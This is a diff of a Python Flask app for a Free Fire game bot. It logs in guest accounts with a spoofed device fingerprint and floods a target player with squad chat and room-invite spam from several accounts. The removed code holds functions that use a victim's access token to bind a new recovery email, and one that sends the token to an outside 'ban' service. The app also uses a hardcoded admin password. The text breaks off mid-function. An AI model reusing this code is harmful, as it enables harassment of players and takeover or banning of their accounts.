@@ -1,4 +1,4 @@
-# app.py - Main Flask Application with Full Features (FINAL VERSION)
+# app.py - Main Flask Application
 import os
 import sys
 import json
@@ -17,51 +17,34 @@ from Crypto.Util.Padding import pad, unpad
 from google.protobuf.timestamp_pb2 import Timestamp
 import logging
 
-# Disable SSL warnings
+# masry imports
+from masry import (
+    EnC_AEs, EnC_PacKeT, DEc_PacKeT, DeCode_PackEt, DecodE_HeX,
+    CrEaTe_ProTo, GeneRaTePk, xMsGFixinG, generate_random_color,
+    JoinSq, ExitSq, OpenCh, MsqSq, GeTSQDaTa
+)
+import Xr
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ==================== CHECK IMPORTS ====================
-try:
-    from masry import (
-        EnC_AEs, EnC_PacKeT, DEc_PacKeT, DeCode_PackEt, DecodE_HeX,
-        CrEaTe_ProTo, GeneRaTePk, xMsGFixinG, generate_random_color,
-        JoinSq, ExitSq, OpenCh, MsqSq, GeTSQDaTa
-    )
-except ImportError as e:
-    print(f"ERROR: Cannot import masry module: {e}")
-    print("Make sure masry.py is in the same directory")
-    sys.exit(1)
+# ==================== LOGGING SETUP ====================
+LOG_FILE = "/tmp/web_debug.log"
+# File handler: DEBUG level (full logs)
+file_handler = logging.FileHandler(LOG_FILE, encoding='utf-8')
+file_handler.setLevel(logging.DEBUG)
+# Stream handler: WARNING only (giảm log spam trên Railway)
+stream_handler = logging.StreamHandler(sys.stdout)
+stream_handler.setLevel(logging.WARNING)
 
-try:
-    import Xr
-except ImportError as e:
-    print(f"ERROR: Cannot import Xr module: {e}")
-    print("Make sure Xr.py is in the same directory")
-    sys.exit(1)
-
-# ==================== LOGGING SETUP (RAILWAY OPTIMIZED) ====================
-# Railway gioi han log stdout -> chi in ERROR ra stdout, tat Werkzeug access log
-
-# Tat Werkzeug request log (moi HTTP request se khong spam stdout)
-logging.getLogger("werkzeug").setLevel(logging.ERROR)
-
-# Tat cac logger khong can thiet
-for _noisy in ("urllib3", "requests", "charset_normalizer"):
-    logging.getLogger(_noisy).setLevel(logging.CRITICAL)
-
-# Chi ERROR tro len moi ra stdout
-_stream_handler = logging.StreamHandler(sys.stdout)
-_stream_handler.setLevel(logging.ERROR)
-_stream_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
-
-logging.basicConfig(level=logging.WARNING, handlers=[_stream_handler])
-
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[file_handler, stream_handler]
+)
 logger = logging.getLogger("FF_WEB")
-logger.setLevel(logging.WARNING)
 
-# info/dbg = silent tren Railway; chi err() moi in ra stdout
-def dbg(msg): pass
-def info(msg): pass
+def dbg(msg): logger.debug(msg)
+def info(msg): logger.info(msg)
 def warn(msg): logger.warning(msg)
 def err(msg): logger.error(msg)
 
@@ -69,7 +52,6 @@ def err(msg): logger.error(msg)
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
-app.config['JSON_AS_ASCII'] = False
 
 # ==================== CẤU HÌNH ====================
 freefire_version = "OB52"
@@ -78,9 +60,27 @@ client_secret = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e
 connected_clients = {}
 connected_clients_lock = threading.Lock()
 
-# Admin configuration - CHANGE THESE FOR PRODUCTION!
+# Admin configuration
 ADMIN_USERNAME = "admin"
-ADMIN_PASSWORD = "admin123"
+ADMIN_PASSWORD = "admin123"  # Change this!
+
+# Session management
+sessions = {}
+
+# Online users tracking
+import uuid
+online_users = {}  # {session_token: last_seen_timestamp}
+online_users_lock = threading.Lock()
+
+def cleanup_online_users():
+    """Remove users inactive for more than 30 seconds"""
+    while True:
+        now = time.time()
+        with online_users_lock:
+            to_remove = [k for k, v in online_users.items() if now - v > 30]
+            for k in to_remove:
+                del online_users[k]
+        time.sleep(10)
 
 # ==================== PACKET HELPERS ====================
 def _encVarint(n):
@@ -121,235 +121,32 @@ def _decodeHex(h):
     return "0" + r if len(r) == 1 else r
 
 def _genPkt(pkt, n, k, iv):
-    try:
-        enc = EnC_PacKeT(pkt, k, iv)
-        l = _decodeHex(len(enc) // 2)
-        if len(l) == 2:
-            hdr = n + "000000"
-        elif len(l) == 3:
-            hdr = n + "00000"
-        elif len(l) == 4:
-            hdr = n + "0000"
-        elif len(l) == 5:
-            hdr = n + "000"
-        else:
-            hdr = n + "000000"
-        return bytes.fromhex(hdr + l + enc)
-    except Exception as e:
-        err(f"_genPkt error: {e}")
-        return b''
+    enc = EnC_PacKeT(pkt, k, iv)
+    l = _decodeHex(len(enc) // 2)
+    if len(l) == 2:
+        hdr = n + "000000"
+    elif len(l) == 3:
+        hdr = n + "00000"
+    elif len(l) == 4:
+        hdr = n + "0000"
+    elif len(l) == 5:
+        hdr = n + "000"
+    else:
+        hdr = n + "000000"
+    return bytes.fromhex(hdr + l + enc)
 
 def _openRoom(k, iv):
-    try:
-        f = {1: 2, 2: {1: 1, 2: 15, 3: 5, 4: "SENZU", 5: "1", 6: 12, 7: 1,
-                        8: 1, 9: 1, 11: 1, 12: 2, 14: 36981056,
-                        15: {1: "IDC3", 2: 126, 3: "VN"},
-                        16: "\u0001\u0003\u0004\u0007\t\n\u000b\u0012\u000f\u000e\u0016\u0019\u001a \u001d",
-                        18: 2368584, 27: 1, 34: "\u0000\u0001", 40: "en", 48: 1,
-                        49: {1: 21}, 50: {1: 36981056, 2: 2368584, 5: 2}}}
-        return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
-    except Exception as e:
-        err(f"_openRoom error: {e}")
-        return b''
+    f = {1: 2, 2: {1: 1, 2: 15, 3: 5, 4: "SENZU", 5: "1", 6: 12, 7: 1,
+                    8: 1, 9: 1, 11: 1, 12: 2, 14: 36981056,
+                    15: {1: "IDC3", 2: 126, 3: "VN"},
+                    16: "\u0001\u0003\u0004\u0007\t\n\u000b\u0012\u000f\u000e\u0016\u0019\u001a \u001d",
+                    18: 2368584, 27: 1, 34: "\u0000\u0001", 40: "en", 48: 1,
+                    49: {1: 21}, 50: {1: 36981056, 2: 2368584, 5: 2}}}
+    return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
 
 def _spmRoom(k, iv, uid):
-    try:
-        f = {1: 22, 2: {1: int(uid)}}
-        return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
-    except Exception as e:
-        err(f"_spmRoom error: {e}")
-        return b''
-
-# ==================== RECOVERY/ACCOUNT FUNCTIONS (from main.py) ====================
-DEFAULT_HEADERS = {
-    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    'Connection': "Keep-Alive",
-    'Accept-Encoding': "gzip",
-}
-
-def convert_seconds(seconds):
-    """Convert seconds to readable format"""
-    try:
-        seconds = int(seconds)
-        d, h = divmod(seconds, 86400)
-        h, m = divmod(h, 3600)
-        m, s = divmod(m, 60)
-        parts = []
-        if d: parts.append(f"{d} days")
-        if h: parts.append(f"{h} hours")
-        if m: parts.append(f"{m} minutes")
-        parts.append(f"{s} seconds")
-        return " ".join(parts)
-    except:
-        return "unknown"
-
-def send_otp(email, access_token):
-    """Send OTP to email for recovery"""
-    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
-    payload = {
-        'app_id': "100067",
-        'access_token': access_token,
-        'email': email,
-        'locale': "en_MA"
-    }
-    headers = {**DEFAULT_HEADERS, 'Accept': "application/json"}
-    try:
-        rsp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                return {"success": True, "message": "OTP sent successfully"}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Unknown error"), "code": data.get("error_code")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except requests.exceptions.Timeout:
-        return {"success": False, "error": "Request timeout"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def verify_otp(otp, email, access_token):
-    """Verify OTP and get verifier token"""
-    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
-    payload = {
-        'app_id': "100067",
-        'access_token': access_token,
-        'otp': otp,
-        'email': email
-    }
-    try:
-        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                verifier_token = data.get("verifier_token")
-                return {"success": True, "verifier_token": verifier_token}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Invalid OTP"), "code": data.get("error_code")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def cancel_request(access_token):
-    """Cancel pending recovery request"""
-    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
-    payload = {'app_id': "100067", 'access_token': access_token}
-    try:
-        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                return {"success": True, "message": "Request cancelled"}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Unknown error")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def create_bind_request(verifier_token, access_token, email):
-    """Create email bind request"""
-    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
-    payload = {
-        'app_id': "100067",
-        'access_token': access_token,
-        'verifier_token': verifier_token,
-        'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
-        'email': email
-    }
-    try:
-        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                return {"success": True, "message": f"Email {email} added successfully"}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Unknown error")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def get_bind_info(access_token):
-    """Get recovery email info"""
-    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
-    payload = {'app_id': "100067", 'access_token': access_token}
-    try:
-        rsp = requests.get(url, params=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                email = data.get("email", "")
-                email_to_be = data.get("email_to_be", "")
-                countdown = data.get("request_exec_countdown", 0)
-                
-                if email == "" and email_to_be == "":
-                    status = "No recovery email set"
-                elif email != "" and email_to_be == "":
-                    status = f"Linked: {email}"
-                elif email == "" and email_to_be != "":
-                    status = f"Pending: {email_to_be} (confirm in {convert_seconds(countdown)})"
-                else:
-                    status = f"Current: {email} → Changing to: {email_to_be} (in {convert_seconds(countdown)})"
-                
-                return {"success": True, "status": status, "email": email, "pending_email": email_to_be, "countdown": countdown}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Unknown error")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def get_linked_platforms(access_token):
-    """Get linked platforms info"""
-    url = "https://100067.connect.garena.com/bind/app/platform/info/get"
-    platform_map = {
-        3: "Facebook", 8: "Gmail", 10: "iCloud",
-        5: "VK", 11: "Twitter", 7: "Huawei"
-    }
-    try:
-        rsp = requests.get(url, params={'access_token': access_token}, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code in [200, 201]:
-            data = rsp.json()
-            if data.get("error_code") == 0:
-                bounded = data.get("bounded_accounts", [])
-                available = data.get("available_platforms", [])
-                
-                platforms = []
-                for x in bounded:
-                    p = x.get('platform')
-                    uinfo = x.get('user_info', {})
-                    platforms.append({
-                        "platform": platform_map.get(p, f"Platform {p}"),
-                        "email": uinfo.get('email', ''),
-                        "nickname": uinfo.get('nickname', '')
-                    })
-                
-                # Find main platform
-                main_platform = None
-                for pid, pname in platform_map.items():
-                    if pid not in available:
-                        main_platform = pname
-                        break
-                
-                return {"success": True, "platforms": platforms, "main_platform": main_platform}
-            else:
-                return {"success": False, "error": data.get("error_msg", "Unknown error")}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def ban_account(access_token):
-    """Send ban request"""
-    url = "https://bannaccess.vercel.app/ban"
-    params = {'access': access_token}
-    try:
-        rsp = requests.get(url, params=params, headers=DEFAULT_HEADERS, timeout=15, verify=False)
-        if rsp.status_code == 200:
-            data = rsp.json()
-            if data.get("success"):
-                return {"success": True, "account_id": data.get("account_id", "N/A"), "platform": data.get("platform", "N/A")}
-            else:
-                return {"success": False, "error": "API returned false"}
-        return {"success": False, "error": f"HTTP {rsp.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
+    f = {1: 22, 2: {1: int(uid)}}
+    return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
 
 # ==================== CLASS xCLF ====================
 class xCLF:
@@ -364,48 +161,46 @@ class xCLF:
         self.retry_count = 0
         self._squad_queue = queue.Queue()
         self._squad_active = False
-        self._sock2_started = False
         self.status = "initializing"
         self.status_message = ""
-        self._running = True
 
         with connected_clients_lock:
             connected_clients[self.id] = self
 
-        info(f"[xCLF] Initialized account {self.id}")
+        info(f"[xCLF] Khởi tạo account {self.id}")
         threading.Thread(target=self.GeNToKeNLogin, daemon=True).start()
 
     def update_status(self, status, message=""):
-        self.status = status
-        self.status_message = message
+        # Only log if status actually changed to avoid log spam
+        if self.status != status or self.status_message != message:
+            self.status = status
+            self.status_message = message
+            info(f"[STATUS:{self.id}] {status} - {message}")
+        else:
+            self.status = status
+            self.status_message = message
 
     def GeTinFoSqMsG(self, teamcode):
+        info(f"[SQUAD:{self.id}] Bắt đầu GeTinFoSqMsG teamcode={teamcode}")
         try:
             if not self.key or not self.iv:
-                return {"success": False, "reason": "Key/IV not ready"}
+                return {"success": False, "reason": "Key/IV chưa sẵn sàng"}
             if not (hasattr(self, 'CliEnts2') and self.CliEnts2):
-                return {"success": False, "reason": "Socket2 not connected"}
+                return {"success": False, "reason": "CliEnts2 chưa kết nối"}
 
-            # Clear queue
             while not self._squad_queue.empty():
-                try:
-                    self._squad_queue.get_nowait()
-                except:
-                    pass
+                self._squad_queue.get_nowait()
             self._squad_active = True
 
-            try:
-                pkt = JoinSq(teamcode, self.key, self.iv)
-                self.CliEnts2.send(pkt)
-            except Exception as e:
-                self._squad_active = False
-                return {"success": False, "reason": f"Send failed: {e}"}
+            pkt = JoinSq(teamcode, self.key, self.iv)
+            self.CliEnts2.send(pkt)
+            info(f"[SQUAD:{self.id}] JoinSq sent → teamcode={teamcode}")
 
             buf = b""
             buf_offset = 0
             start = time.time()
 
-            while time.time() - start < 15 and self._running:
+            while time.time() - start < 15:
                 try:
                     chunk = self._squad_queue.get(timeout=0.5)
                     buf += chunk
@@ -423,7 +218,6 @@ class xCLF:
                             dT = None
                             raw_hex = pkt_body.hex()
 
-                            # Try plaintext decode
                             try:
                                 decoded = DeCode_PackEt(raw_hex)
                                 if decoded:
@@ -431,7 +225,6 @@ class xCLF:
                             except:
                                 pass
 
-                            # Try decrypt then decode
                             if not dT:
                                 try:
                                     dec_hex = DEc_PacKeT(raw_hex, self.key, self.iv)
@@ -446,16 +239,14 @@ class xCLF:
 
                             OwNer, SQuAD, ChaT = GeTSQDaTa(dT)
                             if OwNer and ChaT:
+                                info(f"[SQUAD:{self.id}] ✅ Squad found! Owner={OwNer}")
                                 try:
                                     self.CliEnts2.send(ExitSq('000000', self.key, self.iv))
                                 except:
                                     pass
-                                self._squad_active = False
-                                # Cho server xu ly ExitSq truoc khi OpenCh duoc gui
-                                time.sleep(0.5)
                                 return {"success": True, "OwNer_UiD": OwNer,
                                         "SQuAD_CoDe": SQuAD, "ChaT_CoDe": ChaT}
-                        except Exception:
+                        except Exception as pe:
                             i += 1
                             continue
 
@@ -463,49 +254,38 @@ class xCLF:
 
                 except queue.Empty:
                     continue
-                except Exception:
+                except Exception as e:
+                    err(f"[SQUAD:{self.id}] queue exception: {e}")
                     break
 
-            self._squad_active = False
-            return {"success": False, "reason": "Timeout - no data received"}
+            return {"success": False, "reason": "Timeout — không nhận được dữ liệu"}
 
         except Exception as e:
-            self._squad_active = False
+            err(f"[SQUAD:{self.id}] Exception: {e}")
             return {"success": False, "reason": str(e)}
+        finally:
+            self._squad_active = False
 
     def _chat_worker(self, client, owner_uid, chat_code, message, count, progress_callback=None):
-        # Doi socket1 san sang toi da 10s
-        for _ in range(20):
-            if client.CliEnts is not None:
-                break
-            time.sleep(0.5)
-        if client.CliEnts is None:
-            err(f"[CHAT:{client.id}] CliEnts=None, bo qua")
-            return
+        info(f"[CHAT:{client.id}] Bắt đầu spam chat → owner={owner_uid} count={count}")
         try:
             client.CliEnts.send(OpenCh(owner_uid, chat_code, client.key, client.iv))
             time.sleep(1)
             for i in range(count):
-                if client.CliEnts is None:
-                    break
                 client.CliEnts.send(
                     MsqSq(f'[b][c]{generate_random_color()}{message}', owner_uid, client.key, client.iv))
                 if progress_callback:
                     progress_callback(i + 1, count, "chat")
                 time.sleep(0.5)
+            info(f"[CHAT:{client.id}] ✅ Spam chat xong {count} tin")
         except Exception as e:
             err(f"[CHAT:{client.id}] _chat_worker lỗi: {e}")
 
     def _room_worker(self, client, owner_uid, count, progress_callback=None):
-        # Doi socket2 san sang toi da 10s
-        for _ in range(20):
-            if client.CliEnts2 is not None:
-                break
-            time.sleep(0.5)
-        if client.CliEnts2 is None:
-            err(f"[ROOM:{client.id}] CliEnts2=None, bo qua")
-            return
+        info(f"[ROOM:{client.id}] Bắt đầu spam room → uid={owner_uid} count={count}")
         try:
+            if not client.CliEnts2:
+                return
             k = client.key if isinstance(client.key, bytes) else bytes.fromhex(client.key)
             iv = client.iv if isinstance(client.iv, bytes) else bytes.fromhex(client.iv)
             room_pkt = _openRoom(k, iv)
@@ -513,47 +293,37 @@ class xCLF:
             client.CliEnts2.send(room_pkt)
             time.sleep(0.3)
             for i in range(count):
-                if client.CliEnts2 is None:
-                    break
                 client.CliEnts2.send(spm_pkt)
                 if progress_callback:
                     progress_callback(i + 1, count, "room")
                 time.sleep(0.05)
+            info(f"[ROOM:{client.id}] ✅ Spam room xong {count} lần")
         except Exception as e:
             err(f"[ROOM:{client.id}] _room_worker lỗi: {e}")
 
     def SeNd_SpaM_MsG(self, owner_uid, chat_code, message, count=50, progress_callback=None):
+        info(f"[SPAM] SeNd_SpaM_MsG → owner={owner_uid} count={count}")
         try:
             with connected_clients_lock:
-                # Chi lay client da co key/iv san sang
-                clients = [
-                    c for c in list(connected_clients.values())[:3]
-                    if c.key and c.iv and c.status == "connected"
-                ]
-
-            if not clients:
-                err("[SPAM] Khong co client nao san sang (key/iv/status)")
-                return False
-
+                clients = list(connected_clients.values())[:3]
+            
             threads = []
             for c in clients:
-                t1 = threading.Thread(
+                threads.append(threading.Thread(
                     target=self._chat_worker,
-                    args=(c, owner_uid, chat_code, message, count, progress_callback), daemon=True)
-                t2 = threading.Thread(
+                    args=(c, owner_uid, chat_code, message, count, progress_callback), daemon=True))
+                threads.append(threading.Thread(
                     target=self._room_worker,
-                    args=(c, owner_uid, count, progress_callback), daemon=True)
-                threads.append(t1)
-                threads.append(t2)
-
+                    args=(c, owner_uid, count, progress_callback), daemon=True))
+            
             for t in threads:
                 t.start()
             for t in threads:
                 t.join(timeout=60)
-
+            
             return True
         except Exception as e:
-            err(f"[SPAM] Error: {e}")
+            err(f"[SPAM] SeNd_SpaM_MsG lỗi: {e}")
             return False
 
     def ConnEcT_SerVer_OnLiNe(self, Token, tok, host, port, key, iv, host2, port2):
@@ -565,6 +335,7 @@ class xCLF:
                 self.CliEnts2 = socket.create_connection((host2, int(port2)))
                 self.CliEnts2.send(bytes.fromhex(tok))
                 self.update_status("connected", "Socket2 connected")
+                info(f"[SOCK2:{self.id}] Connected to {host2}:{port2}")
                 while True:
                     try:
                         self.CliEnts2.settimeout(1.0)
@@ -578,6 +349,8 @@ class xCLF:
                     except Exception as e:
                         err(f"[SOCK2:{self.id}] recv lỗi: {e}")
                         break
+                # Socket disconnected, will reconnect
+                self.update_status("connecting", "Socket2 disconnected, reconnecting...")
             except Exception as e:
                 err(f"[SOCK2:{self.id}] Kết nối thất bại: {e}")
                 self.update_status("error", f"Socket2 error: {e}")
@@ -587,102 +360,44 @@ class xCLF:
     def ConnEcT_SerVer(self, Token, tok, host, port, key, iv, host2, port2):
         self.key = key
         self.iv = iv
+        self.update_status("connecting", f"Connecting to {host}:{port}")
+        try:
+            self.CliEnts = socket.create_connection((host, int(port)))
+            self.CliEnts.send(bytes.fromhex(tok))
+            self.CliEnts.recv(1024)
+            self.update_status("connected", "Socket1 connected")
+        except Exception as e:
+            err(f"[SOCK1:{self.id}] Kết nối thất bại: {e}")
+            time.sleep(2)
+            self.ConnEcT_SerVer(Token, tok, host, port, key, iv, host2, port2)
+            return
 
-        # --- Connect Socket1 ---
-        while True:
-            try:
-                err(f"[SOCK1:{self.id}] Trying {host}:{port}...")
-                self.CliEnts = socket.create_connection((host, int(port)), timeout=15)
-                self.CliEnts.send(bytes.fromhex(tok))
-                self.CliEnts.recv(1024)
-                self.update_status("connected", "Socket1 connected")
-                break
-            except Exception as e:
-                err(f"[SOCK1:{self.id}] Connect failed: {e}")
-                self.update_status("error", f"Socket1 error: {e}")
-                # Dong socket cu truoc khi retry
-                try:
-                    self.CliEnts.close()
-                except:
-                    pass
-                self.CliEnts = None
-                time.sleep(3)
+        threading.Thread(
+            target=self.ConnEcT_SerVer_OnLiNe,
+            args=(Token, tok, host, port, key, iv, host2, port2),
+            daemon=True).start()
 
-        # --- Start Socket2 thread (chi start 1 lan) ---
-        if not hasattr(self, '_sock2_started') or not self._sock2_started:
-            self._sock2_started = True
-            threading.Thread(
-                target=self.ConnEcT_SerVer_OnLiNe,
-                args=(Token, tok, host, port, key, iv, host2, port2),
-                daemon=True).start()
-
-        # --- Giu Socket1 song, neu chet thi reconnect ---
         while True:
             try:
                 data = self.CliEnts.recv(1024)
                 if len(data) == 0:
-                    # Server dong ket noi
-                    try:
-                        self.CliEnts.close()
-                    except:
-                        pass
-                    self.CliEnts = None
-                    self.update_status("connecting", "Socket1 disconnected, reconnecting...")
-                    time.sleep(2)
-                    # Reconnect Socket1 trong vong lap hien tai, KHONG de quy
-                    while True:
+                    self.CliEnts.close()
+                    if self.CliEnts2:
                         try:
-                            self.CliEnts = socket.create_connection((host, int(port)), timeout=15)
-                            self.CliEnts.send(bytes.fromhex(tok))
-                            self.CliEnts.recv(1024)
-                            self.update_status("connected", "Socket1 reconnected")
-                            self.retry_count = 0
-                            break
-                        except Exception as e:
-                            err(f"[SOCK1:{self.id}] Reconnect failed: {e}")
-                            try:
-                                self.CliEnts.close()
-                            except:
-                                pass
-                            self.CliEnts = None
-                            time.sleep(3)
-                else:
-                    self.retry_count = 0
-            except OSError as e:
-                # Errno 9 (Bad file descriptor) hoac loi socket khac
-                # Khong log lien tuc — chi log 1 lan roi sleep va reconnect
-                if self.CliEnts is not None:
-                    err(f"[SOCK1:{self.id}] Socket error: {e}")
-                    try:
-                        self.CliEnts.close()
-                    except:
-                        pass
-                    self.CliEnts = None
+                            self.CliEnts2.close()
+                        except:
+                            pass
+                    self.ConnEcT_SerVer(Token, tok, host, port, key, iv, host2, port2)
+                    return
+                self.retry_count = 0
+            except Exception as e:
+                err(f"[SOCK1:{self.id}] recv lỗi: {e}")
                 self.retry_count += 1
                 if self.retry_count >= self.max_retries:
-                    self.update_status("error", "Max retries — re-login")
-                    # Re-login hoan toan thay vi loop Errno 9 mai mai
-                    self._sock2_started = False
-                    threading.Thread(target=self.GeNToKeNLogin, daemon=True).start()
+                    self.update_status("error", "Max retries reached")
                     return
-                time.sleep(3)
-                # Reconnect trong vong lap
-                try:
-                    self.CliEnts = socket.create_connection((host, int(port)), timeout=15)
-                    self.CliEnts.send(bytes.fromhex(tok))
-                    self.CliEnts.recv(1024)
-                    self.update_status("connected", "Socket1 reconnected")
-                    self.retry_count = 0
-                except Exception as re:
-                    err(f"[SOCK1:{self.id}] Reconnect error: {re}")
-            except Exception as e:
-                err(f"[SOCK1:{self.id}] Unexpected error: {e}")
-                try:
-                    self.CliEnts.close()
-                except:
-                    pass
-                self.CliEnts = None
-                time.sleep(3)
+                time.sleep(2)
+                self.ConnEcT_SerVer(Token, tok, host, port, key, iv, host2, port2)
 
     def GeT_Key_Iv(self, serialized_data):
         try:
@@ -693,10 +408,11 @@ class xCLF:
             combined_ts = ts_obj.seconds * 1_000_000_000 + ts_obj.nanos
             return combined_ts, msg.field22, msg.field23
         except Exception as e:
-            err(f"[LOGIN:{self.id}] GeT_Key_Iv error: {e}")
+            err(f"[LOGIN:{self.id}] GeT_Key_Iv lỗi: {e}")
             return None, None, None
 
     def GuestLogin(self, uid, password):
+        info(f"[LOGIN:{uid}] GuestLogin...")
         self.update_status("logging", "Guest login...")
         try:
             resp = requests.post(
@@ -710,26 +426,20 @@ class xCLF:
                 },
                 data={"uid": uid, "password": password, "response_type": "token",
                       "client_type": "2", "client_secret": client_secret, "client_id": "100067"},
-                timeout=30,
                 verify=False
-            )
-            if resp.status_code != 200:
-                self.update_status("error", f"Guest login HTTP {resp.status_code}")
-                return None
-            data = resp.json()
-            if 'access_token' not in data:
-                self.update_status("error", "Guest login failed: no access_token")
-                return None
-            self.Access_ToKen = data['access_token']
-            self.Access_Uid = data['open_id']
-            info(f"[LOGIN:{uid}] GuestLogin OK")
-            time.sleep(0.5)
+            ).json()
+            self.Access_ToKen = resp['access_token']
+            self.Access_Uid = resp['open_id']
+            info(f"[LOGIN:{uid}] GuestLogin OK — open_id={self.Access_Uid}")
+            time.sleep(0.2)
             return self.MajorLogin(self.Access_ToKen, self.Access_Uid)
         except Exception as e:
+            err(f"[LOGIN:{uid}] GuestLogin lỗi: {e}")
             self.update_status("error", f"Guest login failed: {e}")
             return None
 
     def DataLogin(self, JwT_ToKen, PayLoad):
+        info(f"[LOGIN:{self.id}] DataLogin → GetLoginData")
         try:
             resp = requests.post(
                 'https://clientbp.ggpolarbear.com/GetLoginData',
@@ -745,45 +455,29 @@ class xCLF:
                     'Connection': 'close',
                     'Accept-Encoding': 'gzip',
                 },
-                data=PayLoad,
-                timeout=30,
-                verify=False
+                data=PayLoad, verify=False
             )
-            if resp.status_code != 200:
-                return None, None, None, None
-            decoded = DeCode_PackEt(resp.content.hex())
-            if not decoded:
-                return None, None, None, None
-            d = json.loads(decoded)
-            if '32' not in d or '14' not in d:
-                return None, None, None, None
+            d = json.loads(DeCode_PackEt(resp.content.hex()))
             addr = d['32']['data']
             addr2 = d['14']['data']
             ip = addr[:len(addr)-6]
             port = addr[len(addr)-5:]
             ip2 = addr2[:len(addr2)-6]
             port2 = addr2[len(addr2)-5:]
-            # Log IP/port de kiem tra Railway co bi block khong
-            err(f"[LOGIN:{self.id}] SOCK1={ip}:{port} SOCK2={ip2}:{port2}")
+            info(f"[LOGIN:{self.id}] DataLogin OK → sock1={ip}:{port} sock2={ip2}:{port2}")
             return ip, port, ip2, port2
         except Exception as e:
-            err(f"[LOGIN:{self.id}] DataLogin error: {e}")
+            err(f"[LOGIN:{self.id}] DataLogin lỗi: {e}")
             return None, None, None, None
 
     def MajorLogin(self, Access_ToKen, Access_Uid):
+        info(f"[LOGIN:{self.id}] MajorLogin...")
         self.update_status("logging", "Major login...")
         dT = b'\x1a\x132026-01-14 12:19:02"\tfree fire(\x01:\x071.120.1B2Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)J\x08HandheldR\x0cMTN/SpacetelZ\x04WIFI`\x80\nh\xd0\x05r\x03240z-x86-64 SSE3 SSE4.1 SSE4.2 AVX AVX2 | 2400 | 4\x80\x01\xe6\x1e\x8a\x01\x0fAdreno (TM) 640\x92\x01\rOpenGL ES 3.2\x9a\x01+Google|625f716f-91a7-495b-9f16-08fe9d3c6533\xa2\x01\r176.28.145.29\xaa\x01\x02ar\xb2\x01 9132c6fb72caccfdc8120d9ec2cc06b8\xba\x01\x014\xc2\x01\x08Handheld\xca\x01\rOnePlus A5010\xd2\x01\x02SG\xea\x01@3dfa9ab9d25270faf432f7b528564be9ec4790bc744a4eba70225207427d0c40\xf0\x01\x01\xca\x02\x0cMTN/Spacetel\xd2\x02\x04WIFI\xca\x03 1ac4b80ecf0478a44203bf8fac6120f5\xe0\x03\xb5\xee\x02\xe8\x03\xc2\x83\x02\xf0\x03\xaf\x13\xf8\x03\x84\x07\x80\x04\xcf\x92\x02\x88\x04\xb5\xee\x02\x90\x04\xcf\x92\x02\x98\x04\xb5\xee\x02\xb0\x04\x04\xc8\x04\x03\xd2\x04=/data/app/com.dts.freefireth-I1hUq4t4vA6_Qo4C-XgaeQ==/lib/arm\xe0\x04\x01\xea\x04_e62ab9354d8fb5fb081db338acb33491|/data/app/com.dts.freefireth-I1hUq4t4vA6_Qo4C-XgaeQ==/base.apk\xf0\x04\x06\xf8\x04\x01\x8a\x05\x0232\x9a\x05\n2019119624\xb2\x05\tOpenGLES2\xb8\x05\xff\x01\xc0\x05\x04\xe0\x05\xed\xb4\x02\xea\x05\t3rd_party\xf2\x05\\KqsHT8Q+ls0+DdIl/OavRrovpyZYcwgnQHQQcmWwjGmXvBQKOMctxpyopTQWTHvS5JqMigGkSLCLB6Q8x9TAavMfljo=\x88\x06\x01\x90\x06\x01\x9a\x06\x014\xa2\x06\x014\xb2\x06"@\x06GOVT\n\x01\x1a]\x0e\x11^\x00\x17\rKn\x08W\tQ\nhZ\x02Xh\x00\to\x00\x01a'
-        
